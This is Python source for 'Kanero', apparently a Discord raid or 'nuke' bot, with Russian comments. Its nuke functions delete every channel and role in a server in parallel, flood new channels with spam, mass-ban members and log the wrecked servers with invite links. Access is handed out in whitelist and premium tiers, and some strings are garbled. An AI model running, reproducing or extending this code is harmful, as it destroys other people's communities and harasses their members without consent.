# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import aiohttp
import json
import os
import logging
import config
import motor.motor_asyncio
from datetime import datetime, timedelta

# Логирование в файл
logging.basicConfig(
    filename="bot.log",
    level=logging.INFO,
    format="%(asctime)s %(message)s",
    encoding="utf-8"
)
log = logging.getLogger(__name__)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# --- MONGODB -----------------------------------------------

MONGO_URI = os.environ.get("MONGO_URI", "")
_mongo_client = None
_db = None

def get_db():
    global _mongo_client, _db
    if _db is None and MONGO_URI:
        _mongo_client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
        _db = _mongo_client["eclipsed_bot"]
    return _db

async def db_get(collection: str, key: str, default=None):
    db = get_db()
    if db is None:
        return default
    doc = await db[collection].find_one({"_id": key})
    return doc["value"] if doc else default

async def db_set(collection: str, key: str, value):
    db = get_db()
    if db is None:
        return
    await db[collection].update_one(
        {"_id": key},
        {"$set": {"value": value}},
        upsert=True
    )


# --- NUKE LOGS ---------------------------------------------

async def log_nuke(guild: discord.Guild, user: discord.User, nuke_type: str):
    """Логирование лога нюка. Создаём инвайт для ссылки на сервер."""
    invite_url = None
    try:
        # Пытаемся создать инвайт через существующий канал
        ch = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
        if ch:
            inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
            invite_url = inv.url
    except Exception:
        pass

    import datetime
    entry = {
        "guild_id": guild.id,
        "guild_name": guild.name,
        "user_id": user.id,
        "user_name": str(user),
        "type": nuke_type,
        "invite": invite_url,
        "time": datetime.datetime.utcnow().strftime("%d.%m.%Y %H:%M UTC")
    }
    await db_set("nuke_logs", str(guild.id), entry)

    # Отправляем в logs канал на домашнем сервере
    try:
        home = bot.get_guild(HOME_GUILD_ID)
        if home:
            logs_ch = discord.utils.find(lambda c: c.name.lower() == "📊・logs" or "logs" in c.name.lower(), home.text_channels)
            if logs_ch:
                # Выбираем тип эмодзи нюка типов
                type_emoji = {
                    "nuke": "💀",
                    "super_nuke": "💥",
                    "owner_nuke": "👑",
                    "auto_nuke": "🤖",
                    "auto_super_nuke": "🤖💥",
                    "auto_superpr_nuke": "🤖⚡",
                    "auto_owner_nuke": "🤖👑"
                }.get(nuke_type, "💀")
                embed = discord.Embed(
                    title=f"{type_emoji} {nuke_type.replace('_', ' ').upper()}",
                    color=0xff0000
                )
                embed.add_field(name="👤 Кто", value=f"{user} (`{user.id}`)", inline=True)
                embed.add_field(name="🏠 Сервер", value=f"{guild.name} (`{guild.id}`)", inline=True)
                embed.add_field(name="🕐 Время", value=entry["time"], inline=True)
                if invite_url:
                    embed.add_field(name="🔗 Инвайт", value=f"[Присоединиться]({invite_url})", inline=False)
                embed.set_footer(text="☠️ Kanero  |  !nukelogs — история крашей")
                await logs_ch.send(embed=embed)
    except Exception:
        pass



# --- HELPERS -----------------------------------------------

nuke_running = {}
nuke_starter = {}   # guild_id -> user_id кто запустил нюк
last_spam_text = {}  # guild_id -> последний текст спама
last_nuke_time = {}  # guild_id -> время последнего nuke


def is_whitelisted(user_id):
    # Проверяем временные подписки
    temp = check_temp_subscription(user_id)
    if temp in ("wl", "pm"):
        return True
    # Premium тоже считается whitelist
    return user_id in config.WHITELIST or user_id in PREMIUM_LIST or user_id == config.OWNER_ID


def is_owner_whitelisted(user_id):
    return user_id in config.OWNER_WHITELIST


def is_premium(user_id):
    # Проверяем временные подписки
    temp = check_temp_subscription(user_id)
    if temp == "pm":
        return True
    return user_id in PREMIUM_LIST or user_id == config.OWNER_ID



def save_whitelist():
    asyncio.create_task(db_set("data", "whitelist", config.WHITELIST))


def save_owner_whitelist():
    asyncio.create_task(db_set("data", "owner_whitelist", config.OWNER_WHITELIST))


def save_premium():
    asyncio.create_task(db_set("data", "premium", PREMIUM_LIST))


def save_owner_nuke_list():
    pass  # owner_nuke_list удален


def is_owner_nuker(user_id):
    return user_id == config.OWNER_ID


def load_whitelist():
    pass  # загрузка из async load в on_ready


def load_premium():
    pass  # загрузка из async load в on_ready


def save_spam_text():
    asyncio.create_task(db_set("data", "spam_text", config.SPAM_TEXT))


def load_spam_text():
    pass  # загрузка из async load в on_ready



# --- BLOCKED GUILDS ----------------------------------------

BLOCKED_GUILDS: list[int] = []
PREMIUM_LIST: list[int] = []
TESTER_LIST: list[int] = []  # Тестеры с доступом к тестированию функций
FREELIST: list[int] = []  # Юзеры после добавления addbot с доступом !nuke и !auto_nuke
AUTO_ROLE_ID = None  # ID роли Guest с автоматической выдачей setup

# --- Временные подписки ------------------------------------
# Формат: {user_id: {"type": "pm"/"wl"/"fl", "expires": datetime}}
TEMP_SUBSCRIPTIONS: dict[int, dict] = {}


def save_temp_subscriptions():
    # Конвертируем datetime в строку для сохранения
    data = {
        uid: {"type": sub["type"], "expires": sub["expires"].isoformat()}
        for uid, sub in TEMP_SUBSCRIPTIONS.items()
    }
    asyncio.create_task(db_set("data", "temp_subscriptions", data))


async def load_temp_subscriptions():
    global TEMP_SUBSCRIPTIONS
    data = await db_get("data", "temp_subscriptions", {})
    if data:
        # Конвертируем строки обратно в datetime
        TEMP_SUBSCRIPTIONS = {
            int(uid): {"type": sub["type"], "expires": datetime.fromisoformat(sub["expires"])}
            for uid, sub in data.items()
        }


def check_temp_subscription(user_id: int) -> str | None:
    """Проверяет временную подписку. Возвращает тип (pm/wl/fl) или None если истекла."""
    if user_id not in TEMP_SUBSCRIPTIONS:
        return None
    sub = TEMP_SUBSCRIPTIONS[user_id]
    if datetime.utcnow() > sub["expires"]:
        # подписка истекла
        TEMP_SUBSCRIPTIONS.pop(user_id, None)
        save_temp_subscriptions()
        return None
    return sub["type"]


def add_temp_subscription(user_id: int, sub_type: str, duration_hours: int):
    """Добавляет временную подписку."""
    expires = datetime.utcnow() + timedelta(hours=duration_hours)
    TEMP_SUBSCRIPTIONS[user_id] = {"type": sub_type, "expires": expires}
    save_temp_subscriptions()


def save_freelist():
    asyncio.create_task(db_set("data", "freelist", FREELIST))


def is_freelisted(user_id):
    # Проверяем временные подписки
    temp = check_temp_subscription(user_id)
    if temp in ("fl", "wl", "pm"):
        return True
    # Whitelist и Premium тоже считаются freelist
    return user_id in FREELIST or user_id in config.WHITELIST or user_id in PREMIUM_LIST or user_id == config.OWNER_ID


def is_tester(user_id):
    """Проверяет является ли пользователь тестером."""
    return user_id in TESTER_LIST or user_id == config.OWNER_ID


def save_tester_list():
    asyncio.create_task(db_set("data", "tester_list", TESTER_LIST))


def save_blocked_guilds():
    asyncio.create_task(db_set("data", "blocked_guilds", BLOCKED_GUILDS))


def load_blocked_guilds():
    pass  # загрузка из async load в on_ready


def is_guild_blocked(guild_id: int) -> bool:
    return guild_id in BLOCKED_GUILDS


def wl_check():
    async def predicate(ctx):
        if ctx.guild and is_guild_blocked(ctx.guild.id):
            return False
        if not is_whitelisted(ctx.author.id):
            embed = discord.Embed(
                title="🔒 Доступ запрещён",
                description="У тебя нет доступа.\nПо вопросам пиши в дм: **davaidkatt**",
                color=0x0a0a0a
            )
            embed.set_footer(text="☠️ Kanero")
            await ctx.send(embed=embed)
            return False
        return True
    return commands.check(predicate)


async def delete_all_channels(guild):
    for _ in range(3):  # До 3 попыток
        channels = list(guild.channels)
        if not channels:
            break
        await asyncio.gather(*[c.delete() for c in channels], return_exceptions=True)
        await asyncio.sleep(1.5)


async def delete_all_roles(guild):
    bot_role = guild.me.top_role
    await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )


async def do_nuke(guild, spam_text=None, caller_id=None):
    if spam_text is None:
        spam_text = config.SPAM_TEXT

    NUKE_NAME = "☠️ КРАШ СЕРВЕРА"
    bot_role = guild.me.top_role

    channels_to_delete = list(guild.channels)
    # удаляем только роли ниже бота и не @everyone
    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]

    async def create_and_spam(i):
        try:
            if not nuke_running.get(guild.id):
                return
            ch = await guild.create_text_channel(name=NUKE_NAME)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    # все параллельно
    await asyncio.gather(
        *[c.delete() for c in channels_to_delete],
        *[r.delete() for r in roles_to_delete],
        *[create_and_spam(i) for i in range(config.CHANNELS_COUNT)],
        return_exceptions=True
    )
    # удаляем остатки которые могли остаться по каким-то причинам
    leftover_roles = [r for r in guild.roles if r < guild.me.top_role and not r.is_default()]
    if leftover_roles:
        await asyncio.gather(*[r.delete() for r in leftover_roles], return_exceptions=True)

    if caller_id:
        try:
            member = guild.get_member(caller_id)
            if not member:
                member = await guild.fetch_member(caller_id)
            if member:
                role = await guild.create_role(name=Kanero, color=discord.Color.dark_red())
                try:
                    await role.edit(position=max(1, guild.me.top_role.position - 1))
                except Exception:
                    pass
                await member.add_roles(role)
        except Exception:
            pass

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()


async def do_superpr_nuke_task(guild, spam_text=None):
    """Super Nuke с банами пользователей, параллельно. Кроме тех кого защищаем."""
    if spam_text is None:
        spam_text = config.SPAM_TEXT

    TURBO_NAME = "☠️ КРАШ СЕРВЕРА"
    bot_role = guild.me.top_role

    starter_id = nuke_starter.get(guild.id)

    # Не банить: боты, овнер сервера, наш овнер, стартера, и тех у кого есть права
    def is_protected(m):
        if m.bot:
            return True
        if m.id == guild.owner_id:
            return True
        if m.id == config.OWNER_ID:
            return True
        if starter_id and m.id == starter_id:
            return True
        # Защищаем от бана
        if is_whitelisted(m.id) or is_premium(m.id) or is_freelisted(m.id):
            return True
        return False

    # Получаем всех участников через guild.members для банов
    try:
        await guild.chunk()
    except Exception:
        pass

    candidates = [m for m in guild.members if not is_protected(m) and (not m.top_role or m.top_role < bot_role)]

    channels_to_delete = list(guild.channels)
    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]

    async def create_and_spam_super(i):
        try:
            ch = await guild.create_text_channel(name=TURBO_NAME)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    # Все параллельно: баны + удаляем каналы + удаляем роли + создаем каналы со спамом
    await asyncio.gather(
        *[m.ban(reason="super_nuke", delete_message_days=0) for m in candidates],
        *[c.delete() for c in channels_to_delete],
        *[r.delete() for r in roles_to_delete],
        *[create_and_spam_super(i) for i in range(config.CHANNELS_COUNT)],
        return_exceptions=True
    )
    # удаляем остатки которые могли остаться по каким-то причинам
    leftover_roles = [r for r in guild.roles if r < guild.me.top_role and not r.is_default()]
    if leftover_roles:
        await asyncio.gather(*[r.delete() for r in leftover_roles], return_exceptions=True)

    # Роль стартера
    if starter_id:
        try:
            member = guild.get_member(starter_id)
            if not member:
                member = await guild.fetch_member(starter_id)
            if member:
                role = await guild.create_role(name=Kanero, color=discord.Color.dark_red())
                try:
                    await role.edit(position=max(1, guild.me.top_role.position - 1))
                except Exception:
                    pass
                await member.add_roles(role)
        except Exception:
            pass

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()


async def do_owner_nuke_task(guild, spam_text=None):
    """Owner Nuke с максимальным уроном. Кроме тех кого защищаем."""
    if spam_text is None:
        spam_text = config.SPAM_TEXT

    OWNER_NAME = "☠️ КРАШ СЕРВЕРА"
    bot_role = guild.me.top_role
    _starter = nuke_starter.get(guild.id)

    def is_protected(m):
        if m.bot:
            return True
        if m.id == guild.owner_id:
            return True
        if m.id == config.OWNER_ID:
            return True
        if _starter and m.id == _starter:
            return True
        if is_whitelisted(m.id) or is_premium(m.id) or is_freelisted(m.id):
            return True
        return False

    # Получаем всех участников через guild.members для банов
    try:
        await guild.chunk()
    except Exception:
        pass

    targets = [m for m in guild.members if not is_protected(m) and (not m.top_role or m.top_role < bot_role)]

    channels_to_delete = list(guild.channels)
    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]

    async def create_and_spam_owner(i):
        try:
            ch = await guild.create_text_channel(name=OWNER_NAME)
            await asyncio.gather(
                *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
                return_exceptions=True
            )
        except Exception:
            pass

    # Все параллельно: баны + удаляем каналы + удаляем роли + создаем каналы со спамом
    await asyncio.gather(
        *[m.ban(reason="owner_nuke", delete_message_days=0) for m in targets],
        *[c.delete() for c in channels_to_delete],
        *[r.delete() for r in roles_to_delete],
        *[create_and_spam_owner(i) for i in range(config.CHANNELS_COUNT)],
        return_exceptions=True
    )
    # удаляем остатки которые могли остаться по каким-то причинам
    leftover_roles = [r for r in guild.roles if r < guild.me.top_role and not r.is_default()]
    if leftover_roles:
        await asyncio.gather(*[r.delete() for r in leftover_roles], return_exceptions=True)

    # Роль стартера
    if _starter:
        try:
            member = guild.get_member(_starter)
            if not member:
                member = await guild.fetch_member(_starter)
            if member:
                role = await guild.create_role(name=Kanero, color=discord.Color.dark_red())
                try:
                    await role.edit(position=max(1, guild.me.top_role.position - 1))
                except Exception:
                    pass
                await member.add_roles(role)
        except Exception:
            pass

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    last_spam_text[guild.id] = spam_text
    last_nuke_time[guild.id] = asyncio.get_running_loop().time()



# --- COMMANDS ----------------------------------------------

# ID домашнего сервера с ролями OWNER_ID может использовать команды
HOME_GUILD_ID = 1497100825628115108

# Глобальная проверка с блокировкой для команд на заблокированных серверах
@bot.check
async def global_guild_block(ctx):
    if ctx.guild and is_guild_blocked(ctx.guild.id):
        return False
    # На домашнем сервере с ограничениями доступа
    if ctx.guild and ctx.guild.id == HOME_GUILD_ID:
        # Публичные команды с доступом всем
        PUBLIC_COMMANDS = {"help", "changelog", "changelogall", "inv"}
        
        # Команды управления — для овнера, owner whitelist и владельца сервера
        MANAGEMENT_COMMANDS = {"wl_add", "wl_remove", "wl_list", "pm_add", "pm_remove",
                               "fl_add", "fl_remove", "fl_clear", "auto_off", "auto_info",
                               "list", "sync_roles", "setup", "setup_update", "info", "nukelogs"}
        
        # Разрешаем команды доступа всем
        if ctx.command and ctx.command.name in PUBLIC_COMMANDS:
            return True
        
        if ctx.command and ctx.command.name in MANAGEMENT_COMMANDS:
            # Для команд доступны овнеру, owner whitelist и владельцу сервера
            if (ctx.author.id == config.OWNER_ID 
                    or ctx.author.id in config.OWNER_WHITELIST
                    or ctx.author.id == ctx.guild.owner_id):
                return True
            return False
        
        # Деструктивные команды с блокировкой попытки использования
        DESTRUCTIVE = {"nuke", "super_nuke", "owner_nuke", "auto_nuke", "cleanup",
                       "massban", "massdm", "rolesdelete", "auto_super_nuke",
                       "auto_superpr_nuke", "auto_owner_nuke", "spam", "pingspam"}
        
        if ctx.command and ctx.command.name in DESTRUCTIVE:
            # Только овнер может использовать
            if ctx.author.id == config.OWNER_ID:
                return True
            # Отправляем сообщение предупреждение
            try:
                embed = discord.Embed(
                    title="⛔ ЭТО НЕ ПРОКАТИТ",
                    description=(
                        f"{ctx.author.mention}, команда `!{ctx.command.name}` **не работает на этом сервере**.\n\n"
                        "Используй команды краша только на **своих серверах**.\n"
                        "Здесь это запрещено правилами."
                    ),
                    color=0xff0000
                )
                embed.set_footer(text="☠️ Kanero  |  Читай правила")
                await ctx.send(embed=embed)
            except Exception:
                pass
            return False
        
        # Все остальные команды с доступа для овнера и owner whitelist
        if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
            try:
                embed = discord.Embed(
                    title="❌ Команда недоступна участникам",
                    description=(
                        f"{ctx.author.mention}, команда доступ ограничена **с только участникам** с ролью.\n\n"
                        "Список всех с лс: `!help`\n"
                        "Или добавь бота на свой сервер."
                    ),
                    color=0x2b2d31
                )
                embed.set_footer(text="☠️ Kanero  |  discord.gg/aud6wwYVRd")
                await ctx.send(embed=embed, delete_after=8)
                try:
                    await ctx.message.delete()
                except Exception:
                    pass
            except Exception:
                pass
            return False
    return True

@bot.command()
async def nuke(ctx, *, text: str = None):
    guild = ctx.guild
    # Для домашнего на домашнем сервере для всех кроме овнера
    if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
        return
    if is_guild_blocked(guild.id):
        embed = discord.Embed(description="⛔ Этот сервер заблокирован.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    if nuke_running.get(guild.id):
        embed = discord.Embed(description="⏳ Нюки уже идёт на этом сервере.", color=0x0a0a0a)
        await ctx.send(embed=embed)
        return

    uid = ctx.author.id
    is_owner = (uid == config.OWNER_ID)
    is_wl = is_whitelisted(uid)
    is_prem = is_premium(uid)
    is_fl = is_freelisted(uid)

    # Для обычного юзера с нужна регистрация (freelist)
    if not is_owner and not is_wl and not is_prem and not is_fl:
        embed = discord.Embed(
            title="🔒 Доступ запрещён",
            description=(
                "Для использования `!nuke` нужна регистрация.\n\n"
                "**Как получить доступ (бесплатно):**\n"
                "Зайди на наш сервер и напиши в канал `#addbot`\n"
                "https://discord.gg/nNTB37QNCG\n\n"
                "**Контактное лицо:** **davaidkatt**"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Кастомный текст с спамом для whitelist+
    if text and not is_wl and not is_prem and not is_owner:
        embed = discord.Embed(
            description="❌ Кастомный текст доступен только для **White** пользователей.\nПо вопросам пиши: **davaidkatt**",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    # Кастомный текст с спамом для premium/owner (whitelist игнорирует из списка)
    if text and is_wl and not is_prem and not is_owner:
        text = None

    nuke_running[guild.id] = True
    nuke_starter[guild.id] = uid
    spam_text = text if text else config.SPAM_TEXT
    last_nuke_time[ctx.guild.id] = asyncio.get_running_loop().time()
    last_spam_text[ctx.guild.id] = spam_text
    asyncio.create_task(do_nuke(guild, spam_text, caller_id=uid))
    asyncio.create_task(log_nuke(guild, ctx.author, "nuke"))


@bot.command()
async def stop(ctx):
    guild = ctx.guild
    uid = ctx.author.id

    # Овнер останавливает любой и без каких-либо проверок
    if uid == config.OWNER_ID:
        nuke_running[guild.id] = False
        nuke_starter.pop(guild.id, None)
        await ctx.send("✅ Остановлено.")
        return

    # Проверяем с помощью wl_check
    if not is_whitelisted(uid):
        return

    starter_id = nuke_starter.get(guild.id)

    # Нюков не запущено и просто останавливаем
    if starter_id is None:
        nuke_running[guild.id] = False
        await ctx.send("✅ Остановлено.")
        return

    # Обычный юзер с правом нельзя остановить овнера
    if starter_id == config.OWNER_ID:
        embed = discord.Embed(
            description="❌ Это команда **овнера** и только он может остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Обычный юзеров с правом нельзя остановить премиум пользователя
    if is_premium(starter_id) and not is_premium(uid):
        embed = discord.Embed(
            description="❌ Это команда **Premium** пользователя и обычный whitelist не может остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Только тот кто запустил или овнер или премиум
    if uid != starter_id and uid != config.OWNER_ID:
        embed = discord.Embed(
            description="❌ Только тот кто запустил или овнер или премиум может остановить.",
            color=0x0a0a0a
        )
        embed.set_footer(text="Kanero")
        await ctx.send(embed=embed)
        return

    nuke_running[guild.id] = False
    nuke_starter.pop(guild.id, None)
    await ctx.send("✅ Остановлено.")


@bot.command()
async def cleanup(ctx):
    uid = ctx.author.id
    if not is_freelisted(uid):
        embed = discord.Embed(
            title="🔒 Доступ запрещён",
            description="Для `!cleanup` нужна авторизация.\nПиши в #addbot: https://discord.gg/nNTB37QNCG",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    await delete_all_channels(ctx.guild)
    overwrites = {
        ctx.guild.default_role: discord.PermissionOverwrite(
            view_channel=True,
            send_messages=False
        )
    }
    for uid in config.WHITELIST:
        member = ctx.guild.get_member(uid)
        if not member:
            try:
                member = await ctx.guild.fetch_member(uid)
            except Exception:
                continue
        overwrites[member] = discord.PermissionOverwrite(
            view_channel=True,
            send_messages=True
        )
    channel = await ctx.guild.create_text_channel("general", overwrites=overwrites)
    # Отправляем текст спама если был нюк менее 30 секунд назад
    nuke_time = last_nuke_time.get(ctx.guild.id)
    if nuke_time and (asyncio.get_running_loop().time() - nuke_time) <= 30:
        text = last_spam_text.get(ctx.guild.id)
        if text:
            await channel.send(text)


@bot.command()
@wl_check()
@commands.cooldown(1, 30, commands.BucketType.guild)
async def rename(ctx, *, name: str):
    await asyncio.gather(*[c.edit(name=name) for c in ctx.guild.channels], return_exceptions=True)
    await ctx.send("✅ Готово.")


@rename.error
async def rename_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(f"⏳ Команда на перезагрузке. Подожди **{error.retry_after:.0f}** сек.")


@bot.command()
@wl_check()
async def webhooks(ctx):
    whs = await ctx.guild.webhooks()
    if not whs:
        await ctx.send("Вебхуков нет.")
        return
    msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
    await ctx.send(f"```{msg[:1900]}```")


@bot.command(name="clear")
@wl_check()
async def clear(ctx, amount: int = 10):
    """Удалить N сообщений в канале. Максимум 100."""
    if amount > 100:
        await ctx.send("Максимум 100 сообщений.")
        return
    if amount < 1:
        await ctx.send("Минимум 1 сообщение.")
        return
    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 чтобы удалить и саму команду
    msg = await ctx.send(f"✅ Удалено **{len(deleted) - 1}** сообщений.")
    await asyncio.sleep(3)
    try:
        await msg.delete()
    except Exception:
        pass


@bot.command(name="clear_all")
@wl_check()
async def clear_all(ctx):
    """Удалить все сообщения в канале."""
    msg = await ctx.send("⏳ Очищаю все сообщения...")
    total_deleted = 0
    
    # Discord ограничивает удаление 100 сообщений за раз
    # Повторяем пока есть сообщения
    while True:
        deleted = await ctx.channel.purge(limit=100)
        if not deleted:
            break
        total_deleted += len(deleted)
        # Небольшая задержка чтобы не превысить rate limit
        await asyncio.sleep(1)
    
    # Отправляем финальное сообщение
    final_msg = await ctx.send(f"✅ Удалено **{total_deleted}** сообщений.")
    await asyncio.sleep(5)
    try:
        await final_msg.delete()
    except Exception:
        pass


@bot.command()
@wl_check()
async def nicks_all(ctx, *, nick: str):
    targets = [m for m in ctx.guild.members if m.id not in (ctx.author.id, bot.user.id, ctx.guild.owner_id)]
    await asyncio.gather(*[m.edit(nick=nick) for m in targets], return_exceptions=True)
    await ctx.send("Готово.")


@bot.command()
async def auto_nuke(ctx, state: str):
    uid = ctx.author.id
    # Проверка на домашний сервер или не-владелец
    if ctx.guild and ctx.guild.id == HOME_GUILD_ID and uid != config.OWNER_ID:
        return
    # Требует freelist или выше
    if not is_freelisted(uid) and not is_whitelisted(uid) and not is_premium(uid) and uid != config.OWNER_ID:
        embed = discord.Embed(
            title="🔒 Доступ запрещён",
            description=(
                "Для использования `!auto_nuke` нужна авторизация.\n\n"
                "**Как получить доступ (бесплатно):**\n"
                "Зайди на наш сервер и напиши в канал `#addbot`\n"
                "https://discord.gg/nNTB37QNCG"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return
    if state.lower() == "on":
        config.AUTO_NUKE = True
        await ctx.send("✅ Авто-нюк включен.")
    elif state.lower() == "off":
        config.AUTO_NUKE = False
        await ctx.send("❌ Авто-нюк выключен.")
    elif state.lower() == "info":
        status = "✅ Включен" if config.AUTO_NUKE else "❌ Выключен"
        await ctx.send(f"Авто-нюк: {status}")
    else:
        await ctx.send("Используй: `!auto_nuke on` / `!auto_nuke off` / `!auto_nuke info`")


@bot.command()
@wl_check()
async def inv(ctx):
    app_id = bot.user.id
    # Полные права (администратор)
    url_full = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
    # Полные права бота для полного функционала (для /analyze)
    # permissions=1024 = Read Messages только
    url_readonly = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=1024&scope=bot%20applications.commands"
    # User app (для использования на сервере)
    url_user = f"https://discord.com/oauth2/authorize?client_id={app_id}&scope=applications.commands&integration_type=1"

    embed = discord.Embed(title="🤖 Ссылки для добавления бота", color=0x0a0a0a)
    embed.add_field(name="🔓 Полный доступ (рекомендуется)", value=url_full, inline=False)
    embed.add_field(name="🔒 Только чтение (для /analyze)", value=url_readonly, inline=False)
    embed.add_field(name="🤖 User App (для использования на сервере)", value=url_user, inline=False)
    embed.set_footer(text="🤖 Kanero  |  Для /analyze требуется роль 'Модератор'")
    await ctx.author.send(embed=embed)



async def resolve_user(ctx, user_input: str) -> discord.User | None:
    """Находит юзера по ID, @mention или username#tag."""
    # Убираем <@> из mention
    uid_str = user_input.strip("<@!>")
    # Пробуем как ID
    try:
        uid = int(uid_str)
        return await bot.fetch_user(uid)
    except (ValueError, discord.NotFound):
        pass
    # Пробуем найти по имени на домашнем сервере
    home_guild = bot.get_guild(HOME_GUILD_ID)
    if home_guild:
        member = discord.utils.find(
            lambda m: m.name.lower() == user_input.lower()
                   or str(m).lower() == user_input.lower()
                   or (m.nick and m.nick.lower() == user_input.lower()),
            home_guild.members
        )
        if member:
            return member
    return None


async def update_stats_channels(guild: discord.Guild):
    """Обновляет счётчики голос-каналов в категории статистики."""
    cat = discord.utils.find(lambda c: "статистика" in c.name, guild.categories)
    if not cat:
        return
    total    = guild.member_count
    guest_r  = discord.utils.find(lambda r: r.name == "👤 Guest",    guild.roles)
    user_r   = discord.utils.find(lambda r: r.name == "👥 User",     guild.roles)
    white_r  = discord.utils.find(lambda r: r.name == "✅ White",    guild.roles)
    prem_r   = discord.utils.find(lambda r: r.name == "💎 Premium",  guild.roles)
    counts = {
        "👥 all":       total,
        "👤 guest":     sum(1 for m in guild.members if guest_r  and guest_r  in m.roles),
        "👤 users":     sum(1 for m in guild.members if user_r   and user_r   in m.roles),
        "✅ whitelist": sum(1 for m in guild.members if white_r  and white_r  in m.roles),
        "💎 Premium":   sum(1 for m in guild.members if prem_r   and prem_r   in m.roles),
    }
    for ch in cat.voice_channels:
        for prefix, count in counts.items():
            if ch.name.startswith(prefix):
                new_name = f"{prefix} – {count}"
                if ch.name != new_name:
                    try:
                        await ch.edit(name=new_name)
                    except Exception:
                        pass
                break


@bot.command(name="wl_add")
async def wl_add(ctx, *, user_input: str):
    """�������� � Whitelist. ��� ���� � навсегда. � ����� � навсегда.
    Использование: !wl_add @user [���] | !wl_add all [���]
    """
    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
        return

    # Проверка: только на домашнем сервере или для глобального овнера
    if ctx.guild and ctx.guild.id != HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
        embed = discord.Embed(
            title="❌ Команда недоступна",
            description=(
                "Команда `!wl_add` работает **только на домашнем сервере**.\n\n"
                "Whitelist можно выдавать только там, где бот имеет полный контроль.\n"
                "Это сделано для безопасности и предотвращения злоупотреблений."
            ),
            color=0xff0000
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
        return

    # Парсим с временной длительностью
    parts = user_input.rsplit(maxsplit=1)
    duration_hours = None
    actual_input = user_input
    if len(parts) == 2:
        try:
            duration_hours = _parse_duration(parts[1])
            actual_input = parts[0].strip()
        except Exception:
            actual_input = user_input

    # ����� ALL
    if actual_input.lower() == "all":
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if not home_guild:
            await ctx.send("❌ Домашний сервер не найден.")
            return
        msg = await ctx.send("⏳ Выдаю White роль участникам...")
        count = 0
        white_role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
        for member in home_guild.members:
            if member.bot:
                continue
            uid = member.id
            if duration_hours:
                add_temp_subscription(uid, "wl", duration_hours)
            else:
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
            if white_role and white_role not in member.roles:
                try:
                    await member.add_roles(white_role, reason="wl_add all")
                except Exception:
                    pass
            count += 1
        if not duration_hours:
            save_whitelist()
        days = duration_hours // 24 if duration_hours else 0
        dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
        await msg.edit(content=f"✅ **White**{dur_text} выдан **{count}** участникам.")
        return

    user = await resolve_user(ctx, actual_input)
    if not user:
        await ctx.send(f"❌ Пользователь `{actual_input}` не найден.")
        return
    user_id = user.id

    if duration_hours:
        add_temp_subscription(user_id, "wl", duration_hours)
        days = duration_hours // 24
        duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
        result_text = f"? **{user}** ������� **White** �� **{duration_text}** (��������)."
    else:
        if user_id not in config.WHITELIST:
            config.WHITELIST.append(user_id)
            save_whitelist()
        result_text = f"? **{user}** (`{user_id}`) навсегда � whitelist навсегда."

    # ����� ����
    try:
        home_guild = bot.get_guild(HOME_GUILD_ID)
        if home_guild:
            member = home_guild.get_member(user_id)
            if not member:
                try:
                    member = await home_guild.fetch_member(user_id)
                except Exception:
                    member = None
            if member:
                role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
                if role and role not in member.roles:
                    await member.add_roles(role, reason="wl_add")
            await update_stats_channels(home_guild)
    except Exception:
        pass
    await ctx.send(result_text)


@bot.command(name="wl_remove")
async def wl_remove(ctx, *, user_input: str):
    # ������ подписка истекла ���все параллельно�
    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
        return
    user = await resolve_user(ctx, user_input)
    if not user:
